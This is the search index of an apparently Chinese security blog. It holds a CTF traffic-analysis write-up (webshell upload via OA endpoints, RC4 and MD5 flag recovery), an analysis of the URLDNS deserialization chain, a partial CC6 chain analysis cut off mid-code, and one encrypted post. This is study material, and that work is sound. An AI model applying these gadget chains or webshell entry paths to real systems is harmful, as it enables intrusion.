<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记一次从FastAdmin到GetShell</title>
    <link href="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/"/>
    <url>/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b872261bff1ccb4c42e881f3d55ae078cbfe9fc4ece8147f0126326046fcbaad">80f7af2430a3dce6996ee26d1569b2381875b6dd67f3a47d4d4f18813682671e055e2d905c938aea0bf1cb9488fd3533206ff433989cf5bbbc661a383622aa58a5c2006b42c62c86c031bf8df3069f09cfe7cc9148a020e12fc7f566c1821a3e680d0e84a1d685ec61217584c5f8761cb6d96801b6574b93c9a48015c6717ae9d5888ad99384ea6b85290b98da160e0fab99f7cf7ce3bdadd9c6caf0c324c54d2e35bc0b5857dcea8257829a5c2c7bef14b273528f4220d1ff291d5e2c03329d51c147c5090beccb3182e6be311446b1ae90c12d5135bb2a2f6104987d0fe40a292e10f3f339108a6884d4d50f5c9cf15970d7f401f6a86bb8a0e0ea351eae2363ff3f752042e7e9295a4ab8d7c4b8cfc063f5c4e4e0245dece127a33a63e24d743b59686a9084f22630d83715ba125d6ed07e356cf373545677dc2a339564ae14504e1c87c914ebe403ad2f6e7447f3dccc115ce1165be1f141ed4619e883f74604ced0d78a82e35fa597edd6b8bf8fa22b5ec82cfaceb56e78fa5e1924b26896fd535c70c7ec1cf33f24ad751b323dcd2c168b53e91203d0c094dd11b0f8eab430ea12e680a26c4adc9e77732bca59e245844823c518578d529829d79b8de0a5c5624f1c8e167ed3911ddc677160f65b76261c91165f93497da37861d030b1292b0ac3db5d9fe3383db041bb366868bff03b84d0bdec1a4578f136c0978697beb82bcf6f3bc8946e2dbbdea3b4377b1a4a38c56f46a568d1e0d5ddc73193052a19c7f725b2858479c792527838623f67e135a97537d87cf8bbeb5e1be4bb620b7733e817e4c98eb2225778384e5097e2a2fa8446967ea5df534ac54fd3f1b0c79ee79f08b2d5214acf1eb254c3607d8e5f8d11f7a49b6c01532509a23d228d540af8a4c9186fe3889f5faf244a9b41b064ef03ecc3b585140f1b6e639aad129d6abb2a09ffe0769331a551c182fa5e42b5de913ee1f837d22b73b73fbd8c163fbd3591b60e8e85f3f3b42f4d9e24bc59de10cdf8bb29ec4363703120219d53dfd80094d88b4574e5a63466189f845da211782ff73b91fa515d4c73ef4dbb31a3e5bcc0865564b66f94cc7d64fd2d3e0716fc9f10a9035afede98cee6ea7a3b742c66dd0e1e51ec7cd53d8d3908ff56ff92f065fe4e7032eae9276647b28a6b27db34ce488ed5de2fd079227868c11d831b0625a37d63bd69f993362a05e0f3a55a4cb130327e08f6ab3d31c1d6ca6d58e3406d86558d895741e5d59656452e130a4262402b50fc22eacbec47035329a2ef8c3a3242ad97e3e06fb91ef156ff93fce7662529800f5798bd126dbfd2afeb8ba4c259ebea7553243ecb0255851c334622ffd76cf4ee3cfa86d3bd9394404dc88027340a743099e84a84a5bf8d5b88d2a16b3658dd1a67ab85c21e2852a009c343763bb7a1353e36f8c556620c7aa7d5709e8125e31a1ec12474253d4fb093c2a2ec47aeac98426e3807310917b406fb5717c13f03b8a6547d2351bc82ef005510653ce17e326a7f8eefdb62bad704e4607d83f27ea88a5cfe2db9ff5af5d5da5aa4c6e4c4742a8517175fb2e1933fb4fe77ae0de1b4562fa05f5d957cb81e05946de54f19c2ded2f49836588d0bc2fdfdf145d720b83f343667c24dd391ab083ee7169168e90202be2fc716707fd83ce644f76325a12c19c27b01547c234b6962957b080a8c90f7f428de7dbe66b9701b592df54ef8834fb324da7ba6fcd59852dbbcf15b9159e9cb4945341f6f50687abca0f9743b9d339663ae0f7c6759cd449cc936166d8f0a9ad98a7b692c0f425bffc74125279c100ea2416fc1a290ae34c69a70ebc02ea289f60aeeec8fe40e586c8a9e034315de366c4dd34096061997e4a4f34c8b8861c5f0a75ceaff712608fd1c322e4e720d5359336e895276b1f3a2e0388420ee6facec6db91c9ce0151ce2b7f85dd692986a2d68b6bc39d992ee247f520fa815c1a0b219adfc1bd65884516d7a4d18161e7daa9538d450f7332c723fe6095719894659cb84998b474a286a20546e3e393c68cd71723f37873b3383c34a79f852f12993477b5ea4b3486c653c427886625d4bdcfc1219d0134f4dc10fad44ad711e644e78ff357662c78e46b74e3830b9b26566f7be65c7e3891c4aab38aaa0fb4165e91800ac9e9a439f2becb49ac49fd24d42b554c0f34ece0ce0d71ba903724046ef4dfcb870e2fa7275c67f6a0a4dcb3cca3724d2d1b77cd55b82940712d59786f200fbc06dfcbae36228edbc12ef851d1774ce7eea167bcbdae777451b1ebd4b11e35836f2061765dcd22a669c07f0389cade1995935c5a7a1f028690c015bfa23d75607ad08f665c57eb7dcb934b768b8ef287b87e00e29842879082226ef92c2165450224234c92df0d4a7506bfe8d112ba6c5984f31a14a12b9a0cea27695c9b514bcc39ee6b69fc68a69a7adfff6b01fedddc44a017bc41ba35c144dc7b876bb361f09ddc71a7b03da91e3dce785044c85e40dd6366506578617aa535e46557c2d0ee9dc1fa75926138c9fd6a36e90fd7b2419d58babcb65d9e2aadb422c3a436e957f733f3c574370061ff6366d60f4717c853e4a6b281e6cd27c3fdc47c973e40f32c75032ac78e44bdc460ae7288908bc69d6d5ec79fcb431215926cba0f09943ee7bfac9e366aac09a14423097deda6dd575902d76e1c51a9001d4a3b4d1a7eab8a07ff4d2696cfda55435125d1fc5e708ca3f66a5c4efb89343159f3a538a68c7e43735dbf53c358f915c8c956f68bd5d59e2f69efb10ac7847c8b527d75cfc58ffbc3bee7820434f4537934d34b726f8464e40133f6dcdb84d4ef3f371fdb0c0d1731e87b89d762f3a384e5925ada4ead9477341d9e00d69706e2b617f5025a84c40f3b898d93407f22bdbf7d471f852ade39dde4560242f1bbe9a5716599d11e48e25991522e3768ec7a82734d566c7fc2b2d87a9cd950e36ceb29eed59b71b8d0f1dc231f011ba5fa48c187878c937ef9bce707c739ef5223554ebd1d40f4e948510bf40b01b5cd32415c37e6b180a49d0c15a16636c7f45250132055994e801c1b4306877150d87f98d08f3d0f63c6f518577589acd8fb03e80acc9d7ada4876f2c62207255bc159b1cd84261739d35c5bda7f8cf66ca96f09be7913bd4502c4ba71252a49a4c687c35488d2d17db952d5511f3b55ea293c1161e9bb8cc241a6b090a61ec0c56a3330980a4d06694222a49f8fbb062d6be079e99d7e268eb2cda16d7545e9373a20f283e0ea564aa3e61a58080fbad4cce5545f76762486ed38fc7f82d1f29a9864c0bee8e1256ad05f18ed47d5e9a653e81d43c2ab25a49d1bce47d00325669ad56ea4691d00b356d57c96423ff12d2dba552fb0b12092a5c5d85e17a1dfe1ac3e234107c53f69ee6a3f9e747fd232e85575a6bbafb27c031942acc125df509a1ca449380d1a800a82719f2a99783d7a19df5a1f3f55b2aa94badfb07ccab699e2ff488b33fd0df411635b41b20911b1148b74d9c22c376f36889372f31b2f60179485f74ad997e05b8e851bcb145e15b2cfdacf08180878c39444ecec09e2dc37a161b9e8cad580e983a5b30c4d37f593466f9cc50abfd58c26398eaaad0c896379e712d710d70311cb121700dadd3a2dce8f0118bd7f9732cb672f0de7394bd03d90798a9963952b3a144d795ca212f484035a5cd4640d698994a3b2cc74f0dad0377a3bb244c6b2c5115e7e332573e91e3bf5bd4fb600892cededef9e7e2394f6102793640ce97487a751cd0977ba375e4802c39e9533f4013e39dd5899ef1c74119b9a3c34166bad88a44004c86b182a88e856976821a17de5274386a43724021f2dad0233c40cf8e756cb314734403bcc21ed51123090960bcf10c41046c1aaa0bf4f9355bd8284d654e7dbe5825e533373f8edbe8a538e9e8f3bfab7520730bd8d8ffed46c9e2b88bd7e894273fdcc56cedc59137e549f516c6454331389f601eaa9c001ee718324b8e6dd0ae020d0155799c3f525e9ae8ba6ba462e19ac40170dea710f0169179b62ea66b67efa8ca0f0979b86d52234b324011fbbc7a49e3ac5127be901f9b8e3b711a3248ed2b2697e473a41600cfd983f2e3bb70577084d6bc4118f39a7edea877ef92a104fcaad8f702dbdcfcd7d64846a6ecb9dad440547edb72a88f058ed273930b494b985a10586d13f26cbd67ba1cdae2cb48a1f2824f8ff6f93e96099b92e2a68c298b49b964dac501278d43324a605d6b29bd1f4e8dfd0e157d69fa55264e1c41f5cd0bb6d4036872048934617beec68868a956545aa99d8572e7b09ecdd3ba026f8586ed1b04e5a037e2337521b2e03021c94fb5d9c8404b0e2b4fe859d903d851c980a9d098e8b210de1e151feabbf122d21c0548b76d5b75ca69824ddbc26da6a525c093c8a2985108bcf9e2591b0e50c2531c74be46d31b98685d15a4f7fbfc613223d0720962c226267d6063fdcc977b6402891a01607f06eedd0b242497d89fd3b0598c7d81a192d176c17c101fd8c27f45a001a605bdae4245a6f745e8e9eda0a31018f68023c1dcedf420d27e0642b8ef35036996087c84196143c6498b8eb383ec210f76fa93ccac668c3e5f2eefd5922a6c2cd2ce56bee4d6183d17cf31be7ca7e2505420fefeef899bc133cf26a2c9fb792996274efd8189dd21d447ec21136e6babae453940d9a39d20b2c981d0df44e05a83f521dd929b9719dc61e2d534062ea7cd3bdc208dad8b93cc8bfece15a6b37f862df2fa47c01c9139c7cf235627d61b66cb37dfeab8766275c4804681a32097a03e79f4b6c3246931894531860795069386a5792a1e5bd1fcc0f733f5f675b3505a572895726d1e0c599fb7c321c29ece39303b8d490c3be706ef2f4b7c1504f05ae2314caa6fae5a7ffe3f95fb4db718cf7bed5c4a5baf53dbb72ae7494bdf7f9ab4377fb0356b482c89ef3e571277e2206dcd4b19b30d5f1aa70751f42f635e572477e0a3d7c2a647f463e9349933f49458539832ab359b2e0e1f4b12045016ac8418adfec2c4bb843cc552cf065312f8dbb92175f7f4164b3d59685389ff868542e560ac072c3d91a28a59b60d5d16932beadd57b65eaa47b835e63d2ed1cba7d68ab171903536dbef965226f86f63ba0f904c59eee4eab95073b66d8afd2acc3637e307e4c1cd4cc12efb821cb8e1b9e18608be8d07cd7702f6702d321c9fdf043a1764d42b5519a776302e9abca2b9a9766a251eb034f79e75a0489e373b6a9933d1425d1386c698dff43876b9ccadda3f7792be5e3de111a720ff1a3c2bdfe8ddaf14a8a227273c8207744c618ef759c70e48676313ba8730cabde95ef9203f075da6574895a6874c268276e33323970cc7fade28653f7dd3271b6081bcd38f58781927ae5ac22975484881bb1def6815a46033f0c134bd48468f91c3a13046e815743c0cb589605b2079e93cca5c5e060a56996ecd7d412377f9c468c1d511f8f17836e0e1abd730fee464b91bf032ef2d0c119118581524e4509f0009c7fb66643e5da512a7802aed08b2cca4529f137cbe0b49d1874ec140c303c725b98a7c1d4bec2af848cc996d53f1b610a71ab3fc3147e41596f11a35fd341fd6b9d1985793c999dea695a9ebfa4243fc570b6c6d9c1872ca5ba95a940e22f620ac01ae92b55b3a420b82741d7fa2b5c8af8919b82f2b6962f0b35cd237db24b888da82399823eadc1602623a082f55bf557eb035a77dc428c8aebe86d9cfd500ccc372b881ee98ce5f45bcb3b1c959ec1d5ec35c24c3b35be2819dd6bb18d988ffa8bc01c4cee6f1222f021fc1df6673189531687fb869ada6cf4fa46f9c53999e6aa274932227f785af573bb5ac21b100d0f65ceae349149916bf09e95f5e3fe18acf975a4368f07719823ea8686b5dc72eca310d73fa30dbc72637b99267e7f612b013f9f843e21fd23bc1eed57e9c65540d9bc081c5a72d0c2156bd8615f7bc38dbdd5ed3b75d464a24317f29e93abec8ff29bb6fc5a5676342fb23a645cddee51a48e848c9b9c7b1691b6d409eb23c317d1049c2c9a238a822a363f28c02c26c707b28cb84eca4a33d53327f9432e8010dcd79db54db74708dc647714417c2306093c9b03db4c9542a2bec8c101c0a9356d82d52a288c18a3118f28dbc44f8a2cc8db82cd04e15964061f67f141f1caac89eed9d9f89d71f52c6c37e638a1dd9fdb3fe62c91f513b64c0e11bd0b234e9cba253ce932a6fef0a3af8bafc654286b6611f2a5ecabdb4a9b1b96a8e955aa07a1d6346271029dce3329481cc37</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>SRC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SRC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>长城杯初赛MISC</title>
    <link href="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/"/>
    <url>/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/</url>
    
    <content type="html"><![CDATA[<p>闲来无事，花了1h水了两道MISC</p><span id="more"></span><h2 id="漏洞探踪-流量解密"><a href="#漏洞探踪-流量解密" class="headerlink" title="漏洞探踪&流量解密"></a>漏洞探踪&amp;流量解密</h2><h3 id="一阶段"><a href="#一阶段" class="headerlink" title="一阶段"></a>一阶段</h3><p>在流量包中一共有3个IP：</p><p>192.168.30.132；192.168.30.128；192.168.40.141</p><p>明显的是141是web服务的IP</p><p><code>http.response.code==200</code>过滤包，追踪HTTP流，发现存在webshell上传：</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908144511444.png" class=""><p>使用文件包含实现的getShell</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908144626790.png" class=""><p>但攻击的发起方是128的IP，却对不上密码；132的IP仅存在目录扫描的行为，也对不上密码。说明还有其他的IP。</p><p>去OA的访问日志找：先把128和132的IP替换为空白，发现存在流量包中没有的IP：233、234、235，全部试了，发现密码是234</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145107227.png" class=""><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145130507.png" class=""><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.30.234</span> - - <span class="hljs-string">[04/Sep/2024:22:53:38 +0800]</span> <span class="hljs-string">"<span class="hljs-keyword">POST</span> /ispirit/im/upload.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">104</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Outlook/16.0.13929.20296"</span> <span class="hljs-string">"127.0.0.1"</span><br><span class="hljs-number">192.168.30.234</span> - - <span class="hljs-string">[04/Sep/2024:22:54:38 +0800]</span> <span class="hljs-string">"<span class="hljs-keyword">POST</span> /ispirit/interface/gateway.php HTTP/1.1"</span> <span class="hljs-number">200</span> <span class="hljs-number">39</span> <span class="hljs-string">"-"</span> <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Outlook/16.0.13929.20296"</span> <span class="hljs-string">"127.0.0.1"</span><br></code></pre></td></tr></table></figure><h3 id="二阶段"><a href="#二阶段" class="headerlink" title="二阶段"></a>二阶段</h3><p><code>http</code>过滤</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145359904.png" class=""><p>追踪<code>/key</code>和<code>raw</code>，找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/key bdb8e21eace81d5fd21ca445ccb35071<br>/raw bdb8e21eace81d5fd21ca445ccb350715a76f6751576dbe1af49328aa1d2d2bea16ef62afa3a7c616dbdb8e21eace81d5fd21ca445ccb35071<br></code></pre></td></tr></table></figure><p>找到提示：RC4解密</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145558396.png" class=""><p>得到<code>flag:{welcome to beijing}</code></p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145622231.png" class=""><h2 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h2><p><code>http</code>过滤，追踪流：发现上传了压缩包</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908145754345.png" class=""><p>dump出来为：</p><p><code>526172211a070100f3e182eb0b0105070006010180808000304975875502033cc00404a409200e4bdc6b80030008666c61672e747874300100030f20aa2d8a1090a74b0805879d959b353a374086eb57dd537cb6f521a5a480c716e3082ebc4d37a7f19b6a9ec60a03026948f03614dfd8014b71dba6d90e06233df22ec419e4f92b03d420d1bdb94ddb1d9d5bee64e8ff0db02e6e088026d7090ede5c8322965d931c698c7d8609250881833b36ab727fe2977bb2083a3c9a609807cc5abaa1ee9bacab805acf585fa8e4787898ba61cdc9b09f07b6591681802a7329d8a1fb78279db017816c29c53e8808ca2262fe511ef3b7a6d5024ef27170d3242a670da7e0c54273a6710153e7b91a2569036d8ba46750feee6240c21e2868ac203b6ed4a6936ae34dd06bc701141d31c20df791594dc2373dab700a869bc5bb7f1a50c2c0dde5508d2aea3f50f188bef6c0d46c6f22a662ecef8cd81dc405f29117c1dd7cabeee6e78fd29b461c59a63d693c8c72799f505d542d1e350d30679d6fc79476c92ab12096bc863c0d367a014118e96734d712b2544639120228d0c10ffe3deba07fa31ba870342aec44f09afb4b3cddc762fafbecdf0c1e31bc9cb63d4f224b6d477e3056e34ff4365b6d66f2b49ff009d424e0423e0c36ff3eff94726299bb2c22bd5cb4a05f92b6bb761ae1ea4ecd4c24528bb4f064dfc8fcf021364cec02c5c93a7d31828d04cea7cf83e64a9fa4a8f1ba6f755f737725330e4d5247a22374914ab6bea70db52a279a443d194cbfb1e0e7fc339c7a6bc4fc9afb7812dd00dc0623db4cb18e60b72c3ce2969100a9723695de1017062e539448a1d2104beb43969266ef860fe9c95dd9667b90dd81a11f42d549592e32e1ae003f1ae7267c4a66d5b3789776037f4baf82de057a71076c99fad1a309b4ae5301c76fb4b7b851a46b903e7c500ce395607b1cd9da8e1d77565103050400</code></p><p>转换为.rar：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'rar.txt'</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> file:<br>    hex_string = file.read().strip()<br><span class="hljs-comment"># 将每两个字符表示的16进制转换为字节</span><br>byte_data = <span class="hljs-built_in">bytes</span>.fromhex(hex_string)<br><span class="hljs-comment"># 将字节写入新的二进制文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'output.rar'</span>, <span class="hljs-string">'wb'</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(byte_data)<br></code></pre></td></tr></table></figure><p>解压缩需要密码：25ming@</p><img src="/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9BMISC/image-20240908150018532.png" class=""><p>得到一个flag.txt，发现是MD5压缩字符，爆破得到：<code>flag{The_m0st_2ecUre_eNcrYption!!!}</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_hash</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(s.encode()).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_md5_table</span>(<span class="hljs-params">char_set</span>):<br>    md5_table = {}<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> char_set:<br>        md5_value = md5_hash(char)<br>        md5_table[md5_value] = char  <span class="hljs-comment"># 将每个字符的MD5值存入字典</span><br>    <span class="hljs-keyword">return</span> md5_table<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_md5_file</span>(<span class="hljs-params">input_file, md5_table</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(input_file, <span class="hljs-string">'r'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> infile:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> infile:<br>            hash_value = line.strip()  <span class="hljs-comment"># 读取每行的MD5哈希值并去掉换行符</span><br>            <span class="hljs-comment"># 在字典中查找MD5值</span><br>            <span class="hljs-keyword">if</span> hash_value <span class="hljs-keyword">in</span> md5_table:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f"<span class="hljs-subst">{md5_table[hash_value]}</span>"</span>,end=<span class="hljs-string">""</span>)<br><span class="hljs-comment"># 字符集：0-9, a-z, A-Z, 和特殊字符!{}_</span><br>char_set = <span class="hljs-string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!{}_'</span><br>crack_md5_file(<span class="hljs-string">"flag.txt"</span>, generate_md5_table(char_set))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS链分析</title>
    <link href="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>一条简单的反序列化链</p><span id="more"></span><h2 id="URLDNS链"><a href="#URLDNS链" class="headerlink" title="URLDNS链"></a>URLDNS链</h2><p>从<code>ysoserial</code>的源码开始调试，直接在Github下载其源码导入IDEA，Maven会自动加载需要的包。</p><p>直接看到URLDNS.java的文件，我们关注<code>getObject</code>函数里面的这两个代码，说明使用的是<code>HashMap</code>，并且将URL作为其中的键值对造成的反序列化问题</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151237155.png" class="" title="image-20240904151237155"><p>为了方便调试，做一下准备，首先进入URL类中，找到hashCode函数，然后点击<code>handler.hashCode()</code>进去，</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153145840.png" class="" title="image-20240904153145840"><p>在353行处打下断点，这也真是请求DNS解析的地方</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153240256.png" class="" title="image-20240904153240256"><p>然后回到URLDNS.java中，修改main函数为下面这样：</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153356053.png" class="" title="image-20240904153356053"><p>然后我们进行调试，<strong>可以发现会多次进入我们打断点的地方但没有发出请求，这是为什么呢，是因为ysoserial自己重写了这个地方</strong>，修改返回值为null所以无事发生。</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904153803170.png" class="" title="image-20240904153803170"><p>大概3次步进，再次到我们打断点的地方，查看调用栈：</p><p><code>HashMap.readObject()-&gt;HashMap.hash()-&gt;URL.hashCode()-&gt;URLStreamHandler.hashCode()</code></p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904154018970.png" class="" title="image-20240904154018970"><p>于是我们查看HashMap类，我们知道Java反序列化问题的造成都是因为不安全的重写<code>readObject</code>函数造成的，所以搜索<code>readObject</code>函数</p><p>都是会先调用一个默认的<code>readObject</code>然后后面写自己的逻辑，</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904151737711.png" class=""><p>在1397行的位置，可以看到使用了<code>putVal(hash(key), key, value, false, false);</code>这个语句，对key进行了hash运算，我们这里的key就是URL类，在此处下断点，重新调试。</p><p>步进查看<code>hash</code>这个方法，它是继续调用了<code>key.hashCode()</code>来计算，也就是我们这里的<code>URL.hashCode()</code></p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904152213420.png" class="" title="image-20240904152213420"><p>于是继续触发<code>URLStreamHandler.hashCode()</code>，最终到<code>URLStreamHandler.getHostAddress()</code>就发出了DNS请求。</p><img src="/2024/09/04/URLDNS%E9%93%BE%E5%88%86%E6%9E%90/image-20240904155628133.png" class="" title="image-20240904155628133"><p>总的来说，这条链子很简单但很重要，因为它<strong>不需要依赖其他包，仅仅使用了原生的Java包，主要是用来检测是否存在反序列化漏洞</strong>。</p><p><code>HashMap.readObject()</code></p><p><code>-&gt;HashMap.hash()</code></p><p><code>-&gt;URL.hashCode()</code></p><p><code>-&gt;URLStreamHandler.hashCode()</code></p><p><code>-&gt;URLStreamHandler.getHostAddress()</code></p><p><code>-&gt;InetAddress.getByName()</code></p>]]></content>
    
    
    <categories>
      
      <category>漏洞分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞分析</tag>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CC6链</title>
    <link href="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>为了解决高版本Java8中CC1失效的问题，<code>ysoserial</code>中使用了CC6这条链</p><span id="more"></span><p>在Java 8u71以后，<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的逻辑变化了。这里提供一个高版本的<code>sun</code>包源码<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/file/6bfaecb8ff77/src/share/classes/sun">下载地址</a>，改变后发现原来的CC1就无法弹计算器了。</p><p>在项目源码中可以看到，仍然使用<code>LazyMap</code>作为入口，只不过上层调用变了</p><img src="/2024/08/19/CC6%E9%93%BE%E5%88%86%E6%9E%90/image-20240914152451135.png" class="" title="image-20240914152451135"><p>项目使用的类是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code>，在其<code>getValue</code>⽅法中调⽤了<code>this.map.get</code>，我们<strong>注意这里的map就需要是我们构造的LazyMap</strong>。那么如何构造<code>TiedMapEntry</code>实例呢，可以看它的构造函数，直接将我们的<code>LazyMap</code>和随便一个key传入即可构造。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Gets the value of this entry direct from the map.</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the value</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getValue</span><span class="hljs-params">()</span> {<br>    <span class="hljs-keyword">return</span> map.get(key);<br>}<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Constructs a new entry with the given Map and key.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> map  the map</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> key  the key</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> {<br>    <span class="hljs-built_in">super</span>();<br>    <span class="hljs-built_in">this</span>.map = map;<br>    <span class="hljs-built_in">this</span>.key = key;<br>}<br></code></pre></td></tr></table></figure><p>然后在多个函数中调用了<code>getValue</code>方法，但是<code>ysoserial</code>选择的是<code>hashCode()</code>方法，注释也说明了这个方法是<code>MapEntry#hashCode</code>接口的实现，用于返回value的hash值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td 